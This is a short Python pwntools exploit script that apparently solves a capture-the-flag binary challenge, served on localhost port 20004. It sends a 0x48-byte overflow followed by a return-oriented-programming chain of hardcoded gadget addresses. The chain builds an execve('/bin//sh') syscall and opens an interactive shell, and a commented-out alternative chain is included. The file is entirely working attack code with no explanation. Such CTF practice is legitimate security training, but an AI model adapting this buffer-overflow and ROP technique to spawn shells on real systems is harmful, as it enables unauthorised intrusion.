from pwn import *

isremote = True
if isremote:
    r = remote("localhost", 20004)
else:
    r = process("./src/chal")

r.recvuntil("Please enter your name: ")

cdq = p64(0x0000000000401193)
pop_rdi_syscall = p64(0x00000000004011a7)
mov_rsi_rsp = p64(0x0000000000401188)
mov_rsp8_rbp = p64(0x0000000000401182)
mov_rsp8_rsi = p64(0x0000000000401195)
pop_rbp = p64(0x000000000040115d)
pop_rax = p64(0x000000000040118c)
and_rsi_r8 = p64(0x000000000040117e)
syscall = p64(0x00000000004011a8)
mov_rsp32_rdi = p64(0x000000000040119b)
lea_rdi_rsp24 = p64(0x00000000004011a1)


# execve("bin/sh") => (rax: 59, rdi:'bin/sh', rsi:0, rdx:0) + syscall

rop_chain_a = cdq+and_rsi_r8+pop_rdi_syscall+p64(0x68732f2f6e69622f)+p64(0xdeadbeef)+mov_rsp32_rdi+lea_rdi_rsp24+pop_rax+p64(59)+syscall+p64(0xdeadbeef)+p64(0)


rop_chain_b = cdq+and_rsi_r8+mov_rsp8_rbp+pop_rdi_syscall+p64(0xdeadbeef)+p64(0xdeadbeef)+mov_rsp32_rdi+lea_rdi_rsp24+pop_rax+p64(59)+syscall+p64(0xdeadbeef)+p64(0)

raw_input('>')
r.sendline('a'*(0x48)+rop_chain_a)
#r.sendline('a'*(0x40) + p64(0x68732f2f6e69622f) +rop_chain_b)
r.interactive()
